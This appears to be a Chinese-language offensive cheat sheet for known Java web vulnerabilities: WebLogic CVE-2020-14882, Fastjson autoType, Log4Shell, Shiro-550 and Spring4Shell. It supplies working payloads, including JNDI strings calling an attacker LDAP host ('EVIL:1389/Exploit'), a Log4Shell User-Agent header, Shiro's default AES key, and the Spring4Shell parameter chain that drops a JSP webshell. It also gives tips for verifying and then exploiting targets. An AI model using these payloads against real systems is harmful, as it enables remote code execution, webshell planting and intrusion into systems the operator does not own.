| 后台认证绕过 | CVE-2020-14882（配合 14883 RCE） | 10.3.6.0.0–14.1.1.0.0，console 可达 | `/console/css/%252e%252e%252fconsole.portal` 路径穿越绕过登录，配合 handle 参数或 CVE-2020-14883 打 RCE |

> [!tip] WebLogic 其他高频洞：T3 协议反序列化（CVE-2019-2725 / CVE-2020-2551），思路相同——ysoserial 指定 gadget + T3 握手。
> [!warn] 打反序列化前先确认目标版本与出网情况，别盲打高版本。

### [cve-fastjson-log4j] Fastjson 与 Log4j2 速查 | medium | CVE;反序列化;JNDI | Fastjson 1.2.24;1.2.47;Log4Shell
> 两条供应链级 RCE：Fastjson autoType 反序列化与 Log4j 的 JNDI 查表注入。
#### Fastjson
| 版本线 | 编号 | 触发条件 | 利用方式 |
| --- | --- | --- | --- |
| 1.2.24 | autoType 漏洞 | 版本 ≤ 1.2.24 且未关 autoType | `{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://EVIL:1389/Exploit","autoCommit":true}` JNDI 加载远程类 |
| 1.2.47 | 缓存绕过 | 版本 ≤ 1.2.47，autoType 开启或经 `java.lang.Class` 缓存绕过 | 先传 `{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"}` 进映射缓存，再传 JNDI payload 触发 |

#### Log4j2
| 漏洞 | CVE | 触发条件 | 利用方式 |
| --- | --- | --- | --- |
| Log4Shell | CVE-2021-44228 | log4j-core 2.0–2.14.1，攻击者可控字符串进入日志（User-Agent / 参数 / 解析字段） | 日志内容写 `${jndi:ldap://EVIL:1389/Exploit}` 触发 JNDI 远程加载类 RCE |

```http
User-Agent: ${jndi:ldap://EVIL:1389/Exploit}
```

> [!warn] JNDI 利用依赖目标能出网访问 LDAP/RMI；高版本 JDK 默认禁止远程 codebase，需配合本地 class 或序列化 gadget。
> [!tip] 先打带外验证（DNSLog：`${jndi:dns://x.dnslog.cn}`）确认漏洞真实存在，再上 RCE 载荷。

### [cve-shiro-spring] Shiro 默认密钥与 Spring4Shell 速查 | medium | CVE;反序列化;认证绕过 | CVE-2016-4437;CVE-2022-22965
> Shiro rememberMe 硬编码 AES 密钥与 Spring 表单绑定写 shell，两条 Java 框架高频洞。
#### Shiro
| 漏洞 | CVE | 触发条件 | 利用方式 |
| --- | --- | --- | --- |
| rememberMe 反序列化 | CVE-2016-4437（Shiro-550） | Shiro ≤ 1.2.4，或配置沿用硬编码默认密钥 | 用默认 AES 密钥 `kPH+bIxk5D2deZiIxcaaaA==`（CBC）加密序列化 gadget 设为 rememberMe cookie |

判定与利用：
```bash
# 响应 Set-Cookie 含 rememberMe=deleteMe → 启用 Shiro
# 工具：shiro_attack / ysoserial；先解 cookie 验证密钥，再加密 CommonCollections 链打反序列化
```

#### Spring
| 漏洞 | CVE | 触发条件 | 利用方式 |
| --- | --- | --- | --- |
| Spring4Shell | CVE-2022-22965 | JDK 9+、Apache Tomcat WAR 部署、spring-webmvc/webflux 数据绑定（非 @RequestParam 直接绑对象） | POST 参数改 `class.module.classLoader.resources.context.parent.pipeline.first.pattern` 写 Tomcat access log 为 JSP，配合 `suffix=.jsp` 落地 webshell |

> [!warn] Spring4Shell 只对特定部署形态生效（Tomcat WAR + JDK9+），Spring Boot 内嵌容器通常不中；先满足条件再打。
> [!tip] Shiro 打不通默认密钥可跑全部密钥字典或 URLDNS 带外验证；Spring 系列还有 CVE-2022-22947（Gateway）与 CVE-2022-22963（SpEL 表达式注入）可一起测。